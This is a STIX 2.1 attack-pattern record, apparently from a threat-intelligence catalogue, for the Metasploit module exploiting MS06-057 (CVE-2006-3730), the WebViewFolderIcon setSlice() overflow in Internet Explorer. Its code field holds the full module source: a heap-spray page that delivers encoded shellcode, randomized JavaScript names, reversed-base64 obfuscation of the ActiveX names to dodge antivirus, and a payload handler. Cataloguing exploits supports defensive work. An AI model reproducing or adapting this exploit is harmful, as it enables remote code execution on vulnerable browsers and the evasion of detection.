{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c9151e6a-304b-4a53-99c6-b7d93d15a164",
    "created": "2024-08-14T16:45:09.349776Z",
    "modified": "2024-08-14T16:45:09.34978Z",
    "name": "MS06-057 Microsoft Internet Explorer WebViewFolderIcon setSlice() Overflow",
    "description": " This module exploits a flaw in the WebViewFolderIcon ActiveX control included with Windows 2000, Windows XP, and Windows 2003. This flaw was published during the Month of Browser Bugs project (MoBB #18).  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ms06_057_webview_setslice.rb",
            "external_id": "ms06_057_webview_setslice.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-3730"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS06-057 Microsoft Internet Explorer WebViewFolderIcon setSlice() Overflow',\n      'Description'    => %q{\n        This module exploits a flaw in the WebViewFolderIcon ActiveX control\n      included with Windows 2000, Windows XP, and Windows 2003. This flaw was published\n      during the Month of Browser Bugs project (MoBB #18).\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'hdm',\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2006-3730'],\n          [ 'OSVDB', '27110' ],\n          [ 'MSB', 'MS06-057'],\n          [ 'BID', '19030' ]\n        ],\n      'Payload'        =>\n        {\n          'Space'          => 1024,\n          'BadChars'       => \"\\x00\",\n\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['Windows XP SP0-SP2 / IE 6.0SP1 English', {'Ret' => 0x0c0c0c0c} ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2006-07-17'))\n  end\n\n  def on_request_uri(cli, request)\n\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Encode the shellcode\n    shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n\n    # Get a unicode friendly version of the return address\n    addr_word  = [target.ret].pack('V').unpack('H*')[0][0,4]\n\n    # Randomize the javascript variable names\n    var_buffer    = rand_text_alpha(rand(30)+2)\n    var_shellcode = rand_text_alpha(rand(30)+2)\n    var_unescape  = rand_text_alpha(rand(30)+2)\n    var_x         = rand_text_alpha(rand(30)+2)\n    var_i         = rand_text_alpha(rand(30)+2)\n    var_tic       = rand_text_alpha(rand(30)+2)\n    var_toc       = rand_text_alpha(rand(30)+2)\n\n    # Annoying AVs\n    var_aname     = \"==QMu42bjlkclRGbvZ0dllmViV2Vu42bjlkclRGbvZ0dllmViV2V\".reverse.unpack(\"m*\")[0]\n    var_ameth     = \"=U2Ypx2U0V2c\".reverse.unpack(\"m*\")[0]\n\n    # Randomize HTML data\n    html          = rand_text_alpha(rand(30)+2)\n\n\n    # Build out the message\n    content = %Q|\n<html>\n<head>\n  <script>\n  try {\n\n  var #{var_unescape}  = unescape ;\n  var #{var_shellcode} = #{var_unescape}( \"#{shellcode}\" ) ;\n\n  var #{var_buffer} = #{var_unescape}( \"%u#{addr_word}\" ) ;\n  while (#{var_buffer}.length <= 0x100000) #{var_buffer}+=#{var_buffer} ;\n\n  var #{var_x} = new Array() ;\n  for ( var #{var_i} =0 ; #{var_i} < 120 ; #{var_i}++ ) {\n    #{var_x}[ #{var_i} ] =\n      #{var_buffer}.substring( 0 ,  0x100000 - #{var_shellcode}.length ) + #{var_shellcode} ;\n  }\n\n\n  for ( var #{var_i} = 0 ; #{var_i} < 1024 ; #{var_i}++) {\n    var #{var_tic} = new ActiveXObject( '#{var_aname}' );\n    try { #{var_tic}.#{var_ameth}( 0x7ffffffe , 0 , 0 , #{target.ret} ) ; } catch( e ) { }\n    var #{var_toc} = new ActiveXObject( '#{var_aname}' );\n  }\n\n  } catch( e ) { window.location = 'about:blank' ; }\n\n  </script>\n</head>\n<body>\n#{html}\n</body>\n</html>\n    |\n\n    content = Rex::Text.randomize_space(content)\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-07-17",
    "x_mitre_platforms": [
        "win'"
    ]
}